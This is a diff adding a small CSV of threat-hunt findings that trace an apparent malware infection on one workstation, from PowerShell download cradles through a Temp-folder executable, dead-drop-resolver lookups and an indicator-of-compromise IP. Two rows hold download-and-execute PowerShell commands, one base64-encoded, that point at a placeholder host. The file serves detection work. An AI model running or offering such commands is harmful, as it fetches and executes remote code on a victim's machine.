@@ -1,0 +1,9 @@
+hunt,time,host,user,process,detail
+H1 PowerShell abuse,2026-10-05T13:00:07Z,WS-04,madina,powershell.exe,powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcAApAA==
+H1 PowerShell abuse,2026-10-05T13:01:55Z,WS-04,madina,powershell.exe,powershell.exe -c iex (irm https://example.invalid/update.ps1)
+H2 Exec from Temp/AppData via PS,2026-10-05T13:02:43Z,WS-04,madina,lf3t32pa.exe,C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe
+H3 DDR from non-browser,2026-10-05T13:03:29Z,WS-04,madina,lf3t32pa.exe,steamcommunity.com
+H3 DDR from non-browser,2026-10-05T13:03:44Z,WS-04,madina,lf3t32pa.exe,telegram.me
+H4 IOC match (intel-driven),2026-10-05T12:59:59Z,WS-04,madina,chrome.exe,win11install.com
+H4 IOC match (intel-driven),2026-10-05T13:02:43Z,WS-04,madina,lf3t32pa.exe,C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe
+H4 IOC match (intel-driven),2026-10-05T13:05:29Z,WS-04,madina,lf3t32pa.exe,195.201.250.209
